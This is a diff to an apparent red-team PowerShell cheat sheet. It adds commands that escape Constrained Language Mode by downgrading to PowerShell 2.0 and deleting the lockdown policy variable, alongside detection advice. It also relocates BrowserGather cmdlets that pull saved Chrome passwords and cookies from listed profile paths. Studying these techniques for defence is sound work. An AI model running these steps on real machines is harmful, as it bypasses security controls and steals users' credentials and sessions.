@@ -221,6 +221,38 @@ Stop-Transcript # Stop recording
 
 ##### Powershell Restriction
 
+##### PowerShell Constrained Language Mode
+
+Constrained language mode limits the capability of PowerShell to base functionality removing advanced feature support such as .Net & Windows API calls and COM access. 
+
+```powershell
+$ExecutionContext.SessionState.LanguageMode
+FullLanguage
+$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
+$ExecutionContext.SessionState.LanguageMode
+ConstrainedLanguage
+```
+
+PowerShell Constrained Language mode was designed to work with system-wide application control solutions such as Device Guard User Mode Code Integrity (UMCI).
+
+If we have the ability to downgrade to Powershell 2.0, this can allow you to bypass the *ConstrainedLanguagemode*
+
+```powershell
+powershell -version 2
+# Check Language Mode
+$ExecutionContext.SessionState.LanguageMode
+# Remove Constrained Language Mode
+Remove-Item Env:\__PSLockdownPolicy
+```
+
+:white_check_mark: How to protect against or detect that technique:
+
+- *Architecture*: Ensure that you have an endpoint protection system that integrate with Powershell security mechanisms such as AMSI or Constrained Language Mode
+For instance, The Application Whitelisting tools from Windows can be integrated with Constrained Language Mode so that before a powershell script is run, the script host invokes AppLocker to verify the script (cc [here](https://p0w3rsh3ll.wordpress.com/2019/03/07/applocker-and-powershell-how-do-they-tightly-work-together/))
+- *Active Defense*: Monitor for PowerShell downgrade.
+
+##### Tool: PowerShdll
+
 [PowerShdll](https://github.com/p3nt4/PowerShdll) run PowerShell with DLLs only.
 
 PowerShdll can be run with: rundll32.exe, installutil.exe, regsvcs.exe, regasm.exe, regsvr32.exe or as a standalone executable.
@@ -390,18 +422,6 @@ mimikittenz can also easily extract other kinds of juicy info from target proces
 Invoke-mimikittenz.ps1
 ```
 
-It is also possible to extract sensitive browser information through BrowserGather.
-
-[BrowserGather](https://github.com/sekirkity/BrowserGather) include various cmdlets for extracting credential, history, and cookie/session data from Google Chrome
-
-```bash
-# First import the module
-Import-Module .\BrowserGather.ps1
-
-Get-ChromeCreds "C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\<PROFILE>\Login Data"
-Get-ChromeCookies "C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\<PROFILE>\Cookies"
-```
-
 For saved session information from PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP there is SessionGopher
 
 [SessionGopher](https://github.com/Arvanaghi/SessionGopher) is a PowerShell tool that finds and decrypts saved session information for remote access tools.
@@ -421,6 +441,35 @@ Command options:
 Invoke-SessionGopher -Thorough
 # Run remotly
 Invoke-SessionGopher -AllDomain -u domain.com\USER -p PASSWORD
+```
+
+###### Google Chrome
+
+The Chrome default profile folder default locations are:
+
+- WinXP: \[userdir]\Local Settings\Application Data\Google\Chrome\User Data\Default
+- Vista/7/8/10: \[userdir]\AppData\Local\Google\Chrome\User Data\Default
+- Linux: \[userdir]/.config/google-chrome/Default
+- OS X: \[userdir]/Library/Application Support/Google/Chrome/Default
+- iOS: \Applications\com.google.chrome.ios\Library\Application Support\Google\Chrome\Default
+- Android: /userdata/data/com.android.chrome/app_chrome/Default
+- CrOS: \home\user\<GUID>
+
+[BrowserGather](https://github.com/sekirkity/BrowserGather) include various cmdlets for extracting credential, history, and cookie/session data from Google Chrome
+
+```bash
+# First import the module
+Import-Module .\BrowserGather.ps1
+
+Get-ChromeCreds "C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\<PROFILE>\Login Data"
+Get-ChromeCookies "C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\<PROFILE>\Cookies"
+```
+
+[Hindsight](https://github.com/obsidianforensics/hindsight) is a free tool for analyzing web artifacts for Google Chrome/Chromium.
+
+```bash
+hindsight_gui.py
+# Browse on http://localhost:8080
 ```
 
 ##### Data Protection API
